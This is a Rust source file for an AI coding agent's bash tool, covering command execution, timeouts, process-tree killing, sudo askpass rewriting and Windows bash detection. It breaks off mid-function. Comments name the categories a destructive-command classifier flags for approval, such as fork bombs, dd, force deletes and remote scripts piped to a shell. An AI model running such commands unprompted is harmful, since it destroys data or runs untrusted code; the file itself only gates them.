//! `bash` — run a shell command in the working directory, with a timeout and
//! cooperative cancellation (cancel ⇒ the child is killed via `kill_on_drop`).
//!
//! `risk()` is ARG-AWARE: a command is `Risky` only when [`check_destructive_command`]
//! flags it (a faithful port of the production destructive-command classifier —
//! privilege escalation, recursive force deletes, `find -delete`, `dd`, fork bombs,
//! destructive git, remote-script-piped-to-shell, …); everything else is `Safe`.
//! Dropped vs production: streamed stdout (no event channel in the neutral context),
//! first-error-signature capture, telemetry, and the setsid/process-group reaping
//! (the neutral version kills the direct child via `kill_on_drop`).

use super::{err, ok};
use async_trait::async_trait;
use atomcode_kernel::tool::{RiskLevel, Tool, ToolContext, ToolResult};
use serde::Deserialize;
use serde_json::json;
use std::borrow::Cow;
use std::time::{Duration, Instant};
use tokio::io::AsyncReadExt;
use tokio::process::Command;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

const DEFAULT_TIMEOUT_SECS: u64 = 60;
const MAX_TIMEOUT_SECS: u64 = 300;

/// How long a process can be silent (no new stdout/stderr) AFTER having emitted
/// something, before we kill it. Bumped from 30→90 to tolerate legitimate silent
/// phases (file lock waits, dependency downloads, linker blocking, large file
/// reads). This is NOT tool- or language-specific — any process with these
/// patterns benefits. Tradeoff: genuine deadlocks wait 60s longer than before.
const SILENT_KILL_SECS: u64 = 90;

#[derive(Default)]
pub struct BashTool;

#[derive(Deserialize)]
struct Args {
    command: String,
    #[serde(default)]
    timeout: Option<u64>,
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }
    fn description(&self) -> &str {
        // Only advertise interactive password support when the askpass helper is
        // actually wired (Unix interactive TUI); off elsewhere (webui/headless/
        // Windows) so the model isn't told about a prompt that can't appear.
        #[cfg(unix)]
        let askpass_active = crate::askpass::current_env().is_some();
        #[cfg(not(unix))]
        let askpass_active = false;
        shell_tool_description(
            cfg!(target_os = "windows"),
            windows_bash_active(),
            askpass_active,
        )
    }
    fn parameters_schema(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "The shell command to run" },
                "timeout": { "type": "integer", "description": "Max seconds to wait (default 60, max 300)" }
            },
            "required": ["command"]
        })
    }
    fn risk(&self, args: &str) -> RiskLevel {
        // Parse the command out of args; a parse failure is conservatively Risky.
        match serde_json::from_str::<Args>(args) {
            Ok(a) => {
                if check_destructive_command(&a.command).is_some() {
                    RiskLevel::Risky
                } else {
                    RiskLevel::Safe
                }
            }
            Err(_) => RiskLevel::Risky,
        }
    }
    /// "Always allow" scope: the NORMALIZED command (comments stripped, whitespace collapsed),
    /// keeping the DEFAULT per-command scope. Every bash approval is for a destructive command
    /// (see `risk`), so a command-family prefix (`rm *`) would over-approve — per-command is
    /// deliberate. Normalizing means a cosmetic re-emit of the SAME command (changed trailing
    /// `# comment`, added whitespace) keeps the grant instead of re-prompting every turn.
    fn always_grant_scope(&self, args: &str) -> String {
        match serde_json::from_str::<Args>(args) {
            Ok(a) => normalize_command_for_grant(&a.command),
            Err(_) => args.to_string(),
        }
    }
    /// Read-only bash commands (per [`is_read_only_bash`]) may run concurrently;
    /// everything else serializes behind the write-lock. A parse failure is
    /// conservatively NOT parallel-safe.
    fn parallel_safe(&self, args: &str) -> bool {
        serde_json::from_str::<Args>(args)
            .ok()
            .map(|a| is_read_only_bash(&a.command))
            .unwrap_or(false)
    }
    async fn execute(&self, args: &str, ctx: &ToolContext) -> ToolResult {
        let a: Args = match serde_json::from_str(args) {
            Ok(a) => a,
            Err(e) => {
                return err(format!(
                    "bash: invalid arguments: {e}. Expected {{\"command\":\"<shell command>\"}}."
                ))
            }
        };
        let secs = a
            .timeout
            .unwrap_or(DEFAULT_TIMEOUT_SECS)
            .clamp(1, MAX_TIMEOUT_SECS);
        let dur = Duration::from_secs(secs);

        // macOS sudo (and some Linux configs) needs explicit `-A` to use SUDO_ASKPASS —
        // rewrite `sudo` → `sudo -A` so a plain `sudo` pops our password modal. Only when
        // the askpass helper is actually active; off Windows the command is untouched.
        #[cfg(unix)]
        let effective_command = if crate::askpass::current_env().is_some() {
            rewrite_sudo_for_askpass(&a.command)
        } else {
            a.command.clone()
        };
        #[cfg(not(unix))]
        let effective_command = a.command.clone();

        let mut cmd = match build_command(&effective_command) {
            Ok(c) => c,
            Err(reason) => return err(reason),
        };
        #[cfg(unix)]
        crate::process_utils::apply_utf8_locale_env(&mut cmd);
        // Windows GBK locale (CP936): a Python child the model runs (python -c, scripts)
        // defaults its `subprocess` text pipes AND stdio to the console code page, so reading
        // UTF-8 output with the GBK codec dies with UnicodeDecodeError (#876). `PYTHONUTF8=1`
        // (PEP 540) flips `locale.getpreferredencoding()` to utf-8 — which is what `subprocess`
        // text pipes use — so that case stops crashing; `PYTHONIOENCODING` only covers Python's
        // OWN stdio (not child pipes), kept as belt-and-suspenders. Set HERE (not in
        // build_command) so it covers BOTH the cmd.exe and the Git Bash shells. Mirrors
        // AtomCode's own decode_output UTF-8-first policy.
        //
        // KNOWN TRADEOFFS (this is a mitigation, not a complete fix — env vars can't do better):
        //   1. NOT fixed: TRULY binary output. `0x80` is invalid in utf-8 too, so a text-mode
        //      pipe over real binary still crashes — just with a utf-8 codec error. The real
        //      fix there is the model using bytes mode / `errors=` (its code, not ours).
        //   2. MIRROR REGRESSION: the SAME locale flip changes `open()`'s default encoding from
        //      GBK to utf-8, so `open('gbk_file.txt')` WITHOUT an explicit `encoding=` now fails
        //      on a GBK-encoded file (it worked before). `open()` and `subprocess` share
        //      `locale.getpreferredencoding()`, so no env can fix the pipe case without moving
        //      this one — they cannot be decoupled. Accepted because modern files/output are
        //      predominantly utf-8; the model can pass `encoding='gbk'` for legacy files.
        #[cfg(windows)]
        {
            cmd.env("PYTHONUTF8", "1");
            cmd.env("PYTHONIOENCODING", "utf-8");
        }
        // No console-window flash per command on Windows: in headless/daemon mode (e.g.
        // the WeChat clawbot bridge) there's no console to inherit, so each cmd.exe would
        // otherwise allocate a NEW console window on the desktop. No-op off Windows.
        super::suppress_console_window(&mut cmd);
        cmd.current_dir(&ctx.working_dir)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true); // dropping the wait future (cancel/timeout) SIGKILLs the child

        // Unix only: detach from controlling tty (setsid) so sudo/ssh don't fight the TUI
        // for /dev/tty, and inject the askpass env vars so they use our password prompt.
        #[cfg(unix)]
        {
            if let Some(env) = crate::askpass::current_env() {
                apply_askpass_env(&mut cmd, env);
            }
            // Mirror exactly how atomcode-core/src/tool/bash.rs attaches setsid:
            // call the setsid(2) syscall in a pre_exec hook so every bash child gets a
            // new session/pgroup and loses the controlling tty. Failure (already a
            // pgroup leader) is harmless — ignore the return value.
            unsafe {
                cmd.pre_exec(|| {
                    // SAFETY(pre_exec): runs in the forked child before exec —
                    // async-signal-safe libc ONLY. No allocation, locks, panics,
                    // or non-reentrant calls, or the child can deadlock. setsid() is safe.
                    extern "C" {
                        fn setsid() -> i32;
                    }
                    setsid();
                    Ok(())
                });
            }
        }

        let child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => return err(format!("bash: failed to spawn shell: {e}")),
        };
        // Reap the WHOLE shell process tree (mvn → java, pipeline sub-shells,
        // busybox applets) on timeout/cancel — not just the direct child, which
        // is all `kill_on_drop` covers.
        //
        // Windows: a kill-on-close Job Object. Held until this fn returns; the
        // cancel/timeout arms `terminate()` the job explicitly, and if that's
        // skipped (or atomcode dies) dropping the guard closes the handle →
        // KILL_ON_JOB_CLOSE reaps the tree anyway. (A process the command
        // intentionally left running is in the job too, so it's reaped on
        // return — consistent with this tool having no background path.)
        //
        // Unix: the setsid pre_exec made the shell its own pgroup leader
        // (pgid == pid), so `killpg(pid)` reaches the grandchildren that
        // `kill_on_drop` (direct child only) would otherwise orphan — the same
        // leak, and the same fix, as Windows.
        #[cfg(windows)]
        let job_guard = crate::process_utils::assign_child_to_kill_on_close_job(&child);
        // PID captured before `wait_with_output` consumes `child`. On Unix it is
        // the pgid (setsid leader); on Windows it's the `taskkill /T` fallback
        // root for when the Job Object couldn't be set up.
        let child_pid = child.id();
        let wait = child.wait_with_output();

        let kill_tree = || {
            #[cfg(windows)]
            crate::process_utils::kill_windows_tree(&job_guard, child_pid);
            #[cfg(not(target_os = "windows"))]
            if let Some(pgid) = child_pid {
                // SIGKILL the whole group; `kill_on_drop` already SIGKILLs the
                // direct child, this extends it to the detached grandchildren.
                unsafe { killpg(pgid as i32, SIGKILL) };
            }
        };

        tokio::select! {
            biased;
            // Cooperative cancel: returning drops `wait` → kill_on_drop SIGKILLs the child.
            _ = ctx.cancel.cancelled() => {
                kill_tree();
                // The command itself is already shown in the `● Bash(…)`
                // header above (for the user) and in the tool-call record
                // (for the model), so don't echo it back — a long command
                // just wraps into several redundant error lines.
                err("bash: cancelled before completion.".to_string())
            }
            res = tokio::time::timeout(dur, wait) => match res {
                Ok(Ok(output)) => format_output(&output),
                Ok(Err(e)) => err(format!("bash: error running command: {e}")),
                // Timed out: the timeout future drops `wait` → kill_on_drop SIGKILLs the child.
                // Don't echo the command (see the cancel arm); point at the actionable
                // knob — a larger `timeout` — the way the core bash tool does.
                Err(_) => {
                    kill_tree();
                    err(format!(
                        "bash: timed out after {secs}s — pass a larger `timeout` if this command \
                         legitimately needs longer."
                    ))
                }
            }
        }
    }
}

/// Whether the `bash` tool will actually route through a POSIX bash (Git Bash / MSYS2)
/// on THIS machine. The single source of truth for both the tool description AND the
/// system-prompt `Shell:` line, so the model is told the shell IT ACTUALLY GETS instead
/// of a hard-coded lie. `#[cfg(windows)]` consults the cached `detect_windows_bash()` —
/// its FIRST call runs up to a few synchronous, console-suppressed probes (`where bash`,
/// `where git`, then `reg query`), then memoizes; every later call (and `build_command`)
/// reuses the cache. Elsewhere the tool always uses a real `bash`, so the Windows
/// cmd-vs-bash fork does not apply and this is `false`.
pub(crate) fn windows_bash_active() -> bool {
    #[cfg(windows)]
    {
        detect_windows_bash().is_some()
    }
    #[cfg(not(windows))]
    {
        false
    }
}

/// Short label for the system-prompt `Shell:` line on Windows: the POSIX bash when one
/// is active, else cmd.exe. Pure (takes the flag) so it is unit-testable off Windows.
pub(crate) fn windows_shell_label(bash_present: bool) -> &'static str {
    if bash_present {
        "bash"
    } else {
        "cmd.exe"
    }
}

/// The `bash` tool description for the current platform.
///
/// The tool keeps the name `bash` (every provider's model is trained to reach
/// for a `bash` tool), but on Windows it actually executes via `cmd.exe` (see
/// `build_command`). Left unsaid, weak models follow the `bash` name and emit
/// bash-only syntax — heredocs, `$(...)`, `printf '\n'`, single-quote quoting —
/// which cmd.exe can't parse, so the model thrashes into temp-file workarounds.
/// Naming the real shell here removes the contradiction. Pure (takes a bool) so
/// the Windows wording is unit-testable off Windows.
fn shell_tool_description(
    is_windows: bool,
    bash_present: bool,
    askpass_active: bool,
) -> &'static str {
    // Single-source the base paragraph so a Windows/Unix edit can't drift. A
    // macro (not a `const`) because `concat!` only splices literals.
    macro_rules! base {
        () => {
            "Run a shell command in the working directory and return its combined \
             stdout/stderr and exit code. Default timeout 60s (max 300). Destructive \
             commands (recursive force delete, sudo, dd, history rewrites, …) are flagged \
             risky and may require approval.\n\
             Prefer the dedicated tools over bash for file operations — they are \
             gitignore-aware, cross-platform, and cheaper: read_file to read a file (NOT \
             cat/head/tail), grep to search file contents (NOT grep/rg), glob to find \
             files by name (NOT find/fd), list_directory for a directory tree (NOT ls), \
             edit_file to MODIFY a file and write_file to create/overwrite one. NEVER edit \
             a file with a shell command (sed/awk/perl -i, or `>`/`>>`/tee redirection) — \
             it corrupts indentation and encoding (especially on Windows) and cascades; if \
             edit_file reports it can't find your text, RE-READ the file and copy the exact \
             text, or rewrite the whole file with write_file — do not fall back to sed. \
             Reserve bash for real shell work — git, builds, package managers, running \
             commands — and for pipelines / aggregation (wc, sort, uniq, awk, git log) \
             the dedicated tools can't do."
        };
    }
    macro_rules! cmd_suffix {
        () => {
            "\n\
             Windows: commands run via cmd.exe, NOT bash. Use cmd.exe syntax — do NOT use \
             bash-only constructs such as heredocs (<<EOF), command substitution $(...), or \
             printf '\\n'. Chain steps with &&. For multi-line text (e.g. a multi-line commit \
             message) write it to a temp file and pass the file (e.g. git commit -F msg.txt).\n\
             Default to ONE shell — cmd.exe — and do NOT randomly switch between shells mid-task. \
             Do NOT use git-bash forms like `cmd //c`. Use PowerShell (`pwsh -Command ...`) ONLY \
             when a task genuinely needs a PowerShell-only feature, never as a substitute for a \
             cmd.exe builtin. Always quote paths \
             containing spaces, e.g. `if exist \"C:\\Program Files\"` — an unquoted spaced path \
             splits into two tokens and reports a false \"not found\".\n\
             The dedicated file tools above (read_file / grep / glob / list_directory) also \
             sidestep cmd's type/find/dir and all the quoting pitfalls here."
        };
    }
    macro_rules! bash_suffix {
        () => {
            "\n\
             Windows: a POSIX bash (Git Bash / MSYS2) is installed and this tool runs \
             commands via `bash -c` — use bash syntax, NOT cmd.exe. `$(...)`, `&&`, `|`, \
             quoting, heredocs and `printf` all work as on Linux.\n\
             PATHS: bash treats `\\` as an escape, so a Windows path like `C:\\Windows` is \
             mangled — use forward slashes (`C:/Windows`) or POSIX form (`/c/Windows`). \
             Relative paths work (the working directory is already set).\n\
             Windows-native tools (where, reg, tasklist, sc) are still callable by name. Do \
             NOT emit cmd.exe builtins (`dir`, `type`, `copy`, `%VAR%`) — use their bash \
             equivalents (`ls`, `cat`, `cp`, `$VAR`) or the dedicated file tools above.\n\
             OUTPUT: discard a stream with `>/dev/null` (or `2>/dev/null`), NEVER `nul` — \
             here `> nul` does not mean the null device; it creates a stray, undeletable \
             `nul` file in the working directory."
        };
    }
    // Tell the model interactive password prompts work — ONLY when the askpass
    // helper is actually active (Unix interactive TUI). Without this the model
    // assumes the shell is non-interactive, rationalises "the password prompt
    // can't appear", and gives up on `ssh`/`sudo` instead of just running them.
    // With askpass the password is entered by the USER in a secure prompt (the
    // model never sees it), so the guidance is only truthful when it's wired.
    macro_rules! askpass_suffix {
        () => {
            "\n\
             Interactive password prompts ARE supported here: a command that needs a \
             password (e.g. `ssh user@host`, `sudo …`) surfaces a SECURE prompt for the \
             USER to type it — you never see or handle the password. Just run the command \
             normally. Do NOT assume the shell is non-interactive, do NOT add \
             `-o BatchMode=yes` / `-n` / `</dev/null`, and do NOT avoid or give up on such \
             commands. Such a command BLOCKS until the user answers the prompt, so pass a \
             larger `timeout` (e.g. 300) to leave them time to type."
        };
    }
    if is_windows {
        if bash_present {
            concat!(base!(), bash_suffix!())
        } else {
            concat!(base!(), cmd_suffix!())
        }
    } else if askpass_active {
        concat!(base!(), askpass_suffix!())
    } else {
        base!()
    }
}

/// Set the five askpass/socket env vars on the command so sudo/ssh use our TUI
/// password prompt instead of fighting the TUI for /dev/tty.
#[cfg(unix)]
fn apply_askpass_env(cmd: &mut tokio::process::Command, env: &crate::askpass::server::AskpassEnv) {
    cmd.env("SUDO_ASKPASS", &env.askpass_script)
        .env("SSH_ASKPASS", &env.askpass_script)
        .env("SSH_ASKPASS_REQUIRE", "force")
        .env("ATOMCODE_ASKPASS_SOCK", &env.sock_path)
        .env("ATOMCODE_ASKPASS_TOKEN", &env.token);
}

/// Rewrite `sudo` command words to `sudo -A` so the askpass helper is actually used.
///
/// macOS sudo (and some Linux sudoers configs) does NOT auto-invoke `SUDO_ASKPASS` just
/// because no tty is available — it needs an explicit `-A`. Models write plain `sudo`, so
/// without this they hit "sudo: a terminal is required to read the password". Only called
/// when the askpass helper is active (`current_env()` is `Some`).
///
/// `sudo` is matched only in COMMAND POSITION (string start, or after a shell separator
/// `; | & ( { \n`), never inside quotes or as an argument. `-A` is skipped when the sudo
/// invocation already carries `-A`/`--askpass`, `-n`/`--non-interactive` (explicit
/// no-prompt — adding `-A` would wrongly make it prompt), or `-S`/`--stdin`.
#[cfg(unix)]
fn rewrite_sudo_for_askpass(command: &str) -> String {
    let mut out = String::with_capacity(command.len() + 8);
    let mut in_single = false;
    let mut in_double = false;
    let mut cmd_start = true;
    let mut i = 0;
    while i < command.len() {
        let c = command[i..].chars().next().unwrap();
        let clen = c.len_utf8();
        if in_single {
            out.push(c);
            if c == '\'' {
                in_single = false;
            }
            i += clen;
            cmd_start = false;
            continue;
        }
        if in_double {
            out.push(c);
            if c == '"' {
                in_double = false;
            }
            i += clen;
            cmd_start = false;
            continue;
        }
        match c {
            '\'' => {
                in_single = true;
                out.push(c);
                cmd_start = false;
            }
            '"' => {
                in_double = true;
                out.push(c);
                cmd_start = false;
            }
            ';' | '|' | '&' | '(' | '{' | '\n' => {
                out.push(c);
                cmd_start = true;
            }
            _ if c.is_whitespace() => {
                out.push(c); // leading whitespace doesn't end command position
            }
            _ => {
                if cmd_start
                    && command[i..].starts_with("sudo")
                    && command[i + 4..]
                        .chars()
                        .next()
                        .is_some_and(|n| n.is_whitespace())
                    && !sudo_opts_have_askpass_or_noninteractive(&command[i + 4..])
                {
                    out.push_str("sudo -A");
                    i += 4;
                    cmd_start = false;
                    continue;
                }
                out.push(c);
                cmd_start = false;
            }
        }
        i += clen;
    }
    out
}

/// True if the option run immediately after `sudo` already contains `-A`/`--askpass`,
/// `-n`/`--non-interactive`, or `-S`/`--stdin`. Scans leading option tokens (consuming the
/// argument of arg-taking short options like `-u`), stopping at the command word.
#[cfg(unix)]
fn sudo_opts_have_askpass_or_noninteractive(rest: &str) -> bool {
    const ARG_TAKING: &[char] = &['u', 'g', 'p', 'U', 'C', 'c', 'h', 'r', 't', 'T', 'R'];
    let mut tokens = rest.split_whitespace();
    while let Some(tok) = tokens.next() {
        if matches!(tok, ";" | "|" | "&" | "&&" | "||") {
            break;
        }
        if let Some(long) = tok.strip_prefix("--") {
            match long {
                "askpass" | "non-interactive" | "stdin" => return true,
                _ => continue,
            }
        } else if let Some(short) = tok.strip_prefix('-') {
            if short.is_empty() {
                break; // lone "-" is not an option
            }
            if short.contains('A') || short.contains('n') || short.contains('S') {
                return true;
            }
            if short
                .chars()
                .last()
                .is_some_and(|l| ARG_TAKING.contains(&l))
            {
                tokens.next(); // consume this option's argument
            }
        } else {
            break; // first non-option token = the command
        }
    }
    false
}

#[cfg(unix)]
fn build_command(command: &str) -> Result<tokio::process::Command, String> {
    // Prefer bash for the bash-isms models emit; the OS PATH resolves it. If bash is
    // absent the spawn fails and the model sees a clear error (it can retry with sh).
    // HarmonyOS / OpenHarmony does NOT ship bash — fall back to sh (mksh).
    #[cfg(target_env = "ohos")]
    let shell = "sh";
    #[cfg(not(target_env = "ohos"))]
    let shell = "bash";
    let mut cmd = tokio::process::Command::new(shell);
    cmd.arg("-c").arg(command);
    Ok(cmd)
}

// ─── Windows shell compatibility (#882, #883) ────────────────────────────────────
//
// Models (GLM-5.2, Claude, etc.) emit bash-semantic scripts: `$(...)`, `$VAR`, `&&`,
// inline `python -c "..."`, heredocs, `<<<` here-strings, `< <(...)` process substitution.
// The old Windows branch硬走 `cmd.exe /C`, which is NOT a POSIX shell — it silently
// corrupts these constructs: `$` is literal (no expansion), inline Python gets its
// quotes stripped → `SyntaxError: unterminated string literal`, multi-line `git commit
// -m "..."` loses everything after the first newline. The model retries blindly, wasting
// turns + API quota.
//
// Industrial fix: detect bash on Windows (Git Bash / WSL / MSYS2 are common), route
// through `bash -c` to unify with the Unix path. Only when bash is genuinely absent do
// we fall back to cmd.exe — and then we GUARD against unsupported bash constructs so the
// model gets a clear "rewrite for cmd.exe" error instead of silent corruption.

/// `C:\Windows\System32\bash.exe` (and SysWOW64 / Sysnative) is the WSL launcher, NOT a
/// usable POSIX shell here: it runs the command INSIDE the Linux distro — different
/// filesystem (`/mnt/c` vs `C:\`), Linux `python`/`node` (not the user's Windows ones),
/// and a Windows `working_dir` it cannot `cd` into. Excluded from bash detection. Pure
/// path check so it is unit-testable off Windows.
///
/// ALSO excludes the App-Execution-Alias form: Win10/11 exposes WSL's `bash` as a 0-byte
/// reparse stub under `%LOCALAPPDATA%\Microsoft\WindowsApps\bash.exe`. `where bash` often
/// returns THAT first (WindowsApps sits on the user PATH ahead of System32) and it
/// `is_file()`, so without this it would be picked and launch WSL. Installing Docker
/// Desktop (WSL2 backend) enables the alias; a machine with no working distro then fails
/// every `bash -c`. A genuine Git Bash / MSYS2 is never under WindowsApps, so this is safe.
#[cfg_attr(not(windows), allow(dead_code))]
fn is_wsl_launcher(path: &std::path::Path) -> bool {
    let s = path.to_string_lossy().to_ascii_lowercase();
    s.contains(r"\windows\system32\")
        || s.contains(r"\windows\syswow64\")
        || s.contains(r"\windows\sysnative\")
        || s.contains(r"\windowsapps\")
}

/// Derive a Git for Windows `bash.exe` from a `git.exe` path. Git ships `git.exe` in
/// `<root>\cmd\` (and `<root>\bin\`) and `bash.exe` in `<root>\bin\`, so bash is the
/// grandparent of `git.exe` joined with `bin\bash.exe` (works for both layouts since `cmd`
/// and `bin` are siblings under the install root). This is how a Git install on a non-`C:`
/// drive is found when only `git` (not `bash`) is on PATH. Pure path arithmetic (no fs) so
/// it is unit-testable off Windows.
#[cfg_attr(not(windows), allow(dead_code))]
fn bash_beside_git(git_exe: &std::path::Path) -> Option<std::path::PathBuf> {
    let root = git_exe.parent()?.parent()?;
    Some(root.join("bin").join("bash.exe"))
}

/// Parse the install root out of `reg query HKLM\SOFTWARE\GitForWindows /v InstallPath`
/// output. The value line is `    InstallPath    REG_SZ    <path>`; everything after the
/// `REG_SZ` type token is the path (so paths containing spaces survive). Pure — testable
/// off Windows.
#[cfg_attr(not(windows), allow(dead_code))]
fn parse_reg_install_path(reg_stdout: &str) -> Option<&str> {
    reg_stdout.lines().find_map(|l| {
        l.split("REG_SZ")
            .nth(1)
            .map(str::trim)
            .filter(|s| !s.is_empty())
    })
}

/// Detect a Git Bash / MSYS2 bash on Windows. Checks PATH (`where bash`) then common
/// install locations. Deliberately EXCLUDES the WSL launcher (see `is_wsl_launcher`) —
/// only shells that inherit the Windows PATH and honor a Windows cwd are usable here.
/// Returns the resolved path so the caller can `Command::new(path)`; `None` if no usable
/// bash is available (cmd.exe fallback).
///
/// Cheap to call (one `where` + a few `stat`s); cached per-process via `std::sync::OnceLock`.
#[cfg(windows)]
fn detect_windows_bash() -> Option<std::path::PathBuf> {
    use std::sync::OnceLock;
    static CACHED: OnceLock<Option<std::path::PathBuf>> = OnceLock::new();
    CACHED
        .get_or_init(|| {
            // 1. PATH lookup via `where bash` (cmd.exe builtin, always available). SKIP the
            // WSL launcher — it is usually first on PATH but runs in the Linux distro.
            // CREATE_NO_WINDOW: this now runs at prompt-build time (to label the shell), so a
            // bare spawn would flash a console window on every launch (the daemon/headless
            // flicker class). Suppress it — one probe per process, cached below.
            let mut where_bash = std::process::Command::new("where");
            where_bash.arg("bash");
            crate::process_utils::suppress_console_window_sync(&mut where_bash);
            let where_out = where_bash.output();
            if let Ok(o) = where_out {
                if o.status.success() {
                    let txt = String::from_utf8_lossy(&o.stdout);
                    for line in txt.lines() {
                        let p = std::path::PathBuf::from(line.trim());
                        if p.is_file() && !is_wsl_launcher(&p) {
                            return Some(p);
                        }
                    }
                }
            }
            // 2. Derive from `git.exe` on PATH. Git for Windows installed ANYWHERE (incl. a
            // non-`C:` drive like `D:\program\git`) is found here even when its `bin\bash.exe`
            // is not on PATH — as long as `git` is (the common case). `bash.exe` lives beside
            // git under `<root>\bin`.
            let mut where_git = std::process::Command::new("where");
            where_git.arg("git");
            crate::process_utils::suppress_console_window_sync(&mut where_git);
            if let Ok(o) = where_git.output() {
                if o.status.success() {
                    let txt = String::from_utf8_lossy(&o.stdout);
                    for line in txt.lines() {
                        if let Some(b) = bash_beside_git(&std::path::PathBuf::from(line.trim())) {
                            if b.is_file() && !is_wsl_launcher(&b) {
                                return Some(b);
                            }
                        }
                    }
                }
            }
            // 3. `GIT_INSTALL_ROOT` env var (some setups export it) → `<root>\bin\bash.exe`.
            if let Ok(root) = std::env::var("GIT_INSTALL_ROOT") {
                let b = std::path::Path::new(&root).join("bin").join("bash.exe");
                if b.is_file() && !is_wsl_launcher(&b) {
                    return Some(b);
                }
            }
            // 4. Git for Windows registry `InstallPath` (a registered install on any drive).
            for key in [
                r"HKLM\SOFTWARE\GitForWindows",
                r"HKLM\SOFTWARE\WOW6432Node\GitForWindows",
            ] {
                // Suppress the console window like the `where` probes above — this path is
                // reached on eager (prompt-build) detection when NO bash/git is on PATH, i.e.
                // exactly the cmd.exe users, who would otherwise see a `reg` window flash.
                let mut reg = std::process::Command::new("reg");
                reg.args(["query", key, "/v", "InstallPath"]);
                crate::process_utils::suppress_console_window_sync(&mut reg);
                if let Ok(o) = reg.output() {
                    if o.status.success() {
                        let txt = String::from_utf8_lossy(&o.stdout);
                        if let Some(root) = parse_reg_install_path(&txt) {
                            let b = std::path::Path::new(root).join("bin").join("bash.exe");
                            if b.is_file() && !is_wsl_launcher(&b) {
                                return Some(b);
                            }
                        }
                    }
                }
            }
            // 5. Common install locations — Git for Windows / MSYS2 ONLY. Deliberately NOT
            // `System32\bash.exe` (WSL): see `is_wsl_launcher`.
            let candidates = [
                r"C:\Program Files\Git\bin\bash.exe",
                r"C:\Program Files (x86)\Git\bin\bash.exe",
                r"C:\msys64\usr\bin\bash.exe",
                r"C:\msys32\usr\bin\bash.exe",
            ];
            for c in candidates {
                let p = std::path::PathBuf::from(c);
                if p.is_file() && !is_wsl_launcher(&p) {
                    return Some(p);
                }
            }
            None
        })
        .clone()
}

/// Detect bash constructs that cmd.exe cannot interpret. When bash is absent and we must
/// fall back to cmd.exe, returning a clear error here (instead of letting cmd.exe silently
/// corrupt the script) lets the model rewrite instead of retrying blindly. Returns
/// `Some(reason)` when the command should NOT be routed through cmd.exe.
///
/// DELIBERATELY CONSERVATIVE — only flags constructs that cmd.exe provably mishandles AND
/// that a substring match rarely false-positives on. We do NOT flag bare `$VAR` (matches
/// ANY `$` — prices, regex, literals), backticks (markdown / commit messages), or bare
/// `<<` heredocs (bit-shift `1<<4`, C++ `cout <<`): the false-positive rate would block
/// valid cmd.exe commands. Those un-flagged constructs just fall through to cmd.exe
/// (mangled, as before this guard) rather than being hard-errored. `&&` / `||` chains and
/// `2>&1` work in cmd.exe and are left alone.
///
/// Pure / platform-independent so it is unit-testable off Windows.
#[cfg_attr(not(windows), allow(dead_code))]
fn unsupported_bash_construct(command: &str) -> Option<&'static str> {
    // Command substitution `$(...)` — cmd.exe has no `$()` syntax. (Small residual FP risk
    // on e.g. awk `$(NF)` passed to a child; accepted for the high value of this one.)
    if command.contains("$(") {
        return Some("command substitution `$(...)` — cmd.exe has no `$()` syntax");
    }
    // Here-string `<<<` — cmd.exe has no here-string.
    if command.contains("<<<") {
        return Some("here-string `<<<` — cmd.exe does not support here-strings");
    }
    // Process substitution `< <(...)` / `>(...)` — cmd.exe has no /dev/fd.
    if command.contains("< <(") || command.contains(">(") {
        return Some("process substitution `< <(...)` / `>(...)` — cmd.exe has no /dev/fd");
    }
    None
}

/// Rewrite a bash redirect whose target is the bare Windows device name `nul`
/// (case-insensitive) to `/dev/null`.
///
/// On Windows the `bash` tool routes through Git Bash / MSYS2 (see `build_command`), where
/// `nul` is NOT the null device — only `/dev/null` is. So the cmd.exe idiom `command > nul`
/// (which models reflexively emit to discard output) treats `nul` as a plain relative
/// filename and bash CREATES A REAL FILE named `nul` in the working directory. Worse, MSYS2
/// opens files via NT-native paths (`\??\…`), bypassing Win32's reserved-name guard, so the
/// file genuinely exists yet cannot be removed via Explorer or `del nul` (both re-apply the
/// Win32 guard and address the device) — it needs `del \\.\nul`. Users hit stray, undeletable
/// `nul` files. Rewriting the redirect target to `/dev/null` preserves the model's intent
/// (discard the stream) and never touches disk.
///
/// ONLY a `nul` that appears as a REDIRECT TARGET is rewritten. `echo nul`, `cat nul.txt`,
/// `grep nul file`, and any `nul` inside quotes are left untouched. Quote/escape state is
/// tracked so a `> nul` inside a string literal is preserved. Pure / platform-independent
/// (scans bytes; ASCII operators never collide with UTF-8 continuation bytes) so it is
/// unit-testable off Windows.
///
/// KNOWN LIMITATIONS (all deliberately accepted — the bash_suffix description warning is the
/// primary, robust mitigation; this rewrite is a best-effort safety net for the reflex idiom):
///   * Heredocs: a command containing `<<` is left ENTIRELY untouched, because a `> nul` in a
///     heredoc/here-string BODY may be literal content the model is writing verbatim (e.g. a
///     `.bat` where `nul` really IS the cmd.exe device). Skipping avoids silently corrupting
///     that content; the cost is that a genuine top-level `> nul` in the same command is not
///     rewritten (pre-fix stray-file behavior persists — a miss, never a new corruption).
///   * Not covered (rare, non-cmd idioms → at worst a stray file, same as before): the csh-style
///     `>& nul` dup form, `> nul` nested inside `"$(…)"`, the colon-device spelling `> nul:`,
///     and `< nul` input redirects. `[[ … > nul ]]` / `# comment > nul` are not distinguished
///     from redirects but are negligible in practice.
#[cfg_attr(not(windows), allow(dead_code))]
fn rewrite_nul_redirect(command: &str) -> Cow<'_, str> {
    let bytes = command.as_bytes();
    if !bytes.contains(&b'>') {
        return Cow::Borrowed(command); // no redirect operator ⇒ nothing to rewrite
    }
    // Heredoc / here-string present: `> nul` may live in a verbatim body (a `.bat` the model
    // is writing, where `nul` is the real cmd.exe device). Rewriting it would silently corrupt
    // that content, so bail entirely — a possible stray file is strictly better than mutating
    // data the user asked to write verbatim.
    if command.contains("<<") {
        return Cow::Borrowed(command);
    }
    // A `nul` redirect target ends at one of these (or end-of-string). A following `.`,
    // alnum, `_`, `/` etc. means it is `nul.txt` / `nully` / a path — NOT the bare device.
    fn is_boundary(next: Option<u8>) -> bool {
        match next {
            None => true,
            Some(b) => matches!(
                b,
                b' ' | b'\t' | b'\n' | b'\r' | b';' | b'&' | b'|' | b'<' | b'>' | b')' | b'`'
            ),
        }
    }
    let n = bytes.len();
    let mut result = String::new();
